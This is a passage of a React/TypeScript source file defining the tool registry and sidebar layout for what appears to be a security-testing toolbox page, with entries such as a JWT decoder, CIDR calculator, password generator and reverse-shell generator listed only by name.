  { id: "jwt",      label: "JWT Decoder",  group: "Tokens",   component: <JWTTool /> },
  { id: "uuid",     label: "UUID Gen",     group: "Tokens",   component: <UuidTool /> },
  { id: "ts",       label: "Timestamp",    group: "Tokens",   component: <TimestampTool /> },
  // Data
  { id: "json",     label: "JSON Format",  group: "Data",     component: <JsonTool /> },
  { id: "regex",    label: "Regex Tester", group: "Data",     component: <RegexTool /> },
  // Network
  { id: "cidr",     label: "CIDR Calc",    group: "Network",  component: <CidrTool /> },
  { id: "ua",       label: "User Agents",  group: "Network",  component: <UaTool /> },
  // Payloads
  { id: "pass",     label: "Password Gen", group: "Payloads", component: <PasswordTool /> },
  { id: "revshell", label: "Rev Shell",    group: "Payloads", component: <RevShellTool /> },
  { id: "cewl",     label: "CeWL Wordlist", group: "Payloads", component: <CewlTool /> },
  // Reference
  { id: "methodology", label: "Exploit Methodology", group: "Reference", component: <MethodologyTool /> },
];

export default function ToolsPage() {
  const [active, setActive] = useState("base64");
  const [sidebarOpen, setSidebarOpen] = useState(true);
  useEffect(() => {
    if (typeof window !== "undefined" && window.innerWidth < 768) setSidebarOpen(false);
  }, []);
  const current = TOOLS.find((t) => t.id === active);

  // Group tools
  const groups = useMemo(() => {
    const out: Record<string, ToolEntry[]> = {};
    for (const t of TOOLS) {
      (out[t.group] ||= []).push(t);
    }
    return out;
  }, []);

  return (
    <div className="bg-zinc-950 min-h-[calc(100vh-56px)] text-zinc-100 flex flex-col">
      <div className="flex flex-1" style={{ height: "calc(100vh - 56px)" }}>

        {/* Sidebar */}
        <aside className={`${sidebarOpen ? "w-56" : "w-12"} shrink-0 border-r border-zinc-800 bg-zinc-900 overflow-y-auto transition-all duration-200`}>
          <div className="flex items-center justify-between p-2 border-b border-zinc-800">
            {sidebarOpen && <p className="text-[10px] font-semibold uppercase tracking-wider text-zinc-500">Toolbox</p>}
            <button
              onClick={() => setSidebarOpen((v) => !v)}
              className="rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 text-[10px] text-zinc-400 hover:text-zinc-200"
            >{sidebarOpen ? "←" : "→"}</button>
          </div>

          {sidebarOpen && Object.entries(groups).map(([group, tools]) => (
            <div key={group} className="border-b border-zinc-800">
              <p className="px-3 pt-2 pb-1 text-[10px] font-semibold uppercase tracking-wider text-zinc-600">{group}</p>
              <div className="p-1">
                {tools.map((tool) => (
                  <button
                    key={tool.id}
                    onClick={() => setActive(tool.id)}
                    className={`w-full rounded px-3 py-1.5 text-left text-xs transition-colors mb-0.5 border-l-2 ${
                      active === tool.id
                        ? "border-l-fuchsia-500 bg-zinc-800 text-zinc-100"
                        : "border-l-transparent text-zinc-500 hover:text-zinc-300 hover:bg-zinc-800"
                    }`}
                  >
                    {tool.label}
                  </button>
                ))}
              </div>
            </div>
          ))}
        </aside>

        {/* Content */}
        <div className="flex-1 overflow-y-auto p-4 min-w-0">
          <div className="mb-3 border-b border-zinc-800 pb-2.5 flex items-center gap-2">
            <span className="rounded border border-zinc-700 bg-zinc-800 px-2 py-0.5 text-[10px] uppercase tracking-wider text-zinc-400">
              {current?.group}
            </span>
            <p className="text-sm font-semibold text-zinc-200">{current?.label}</p>
          </div>
          {current?.component}
        </div>
      </div>
    </div>
  );
}
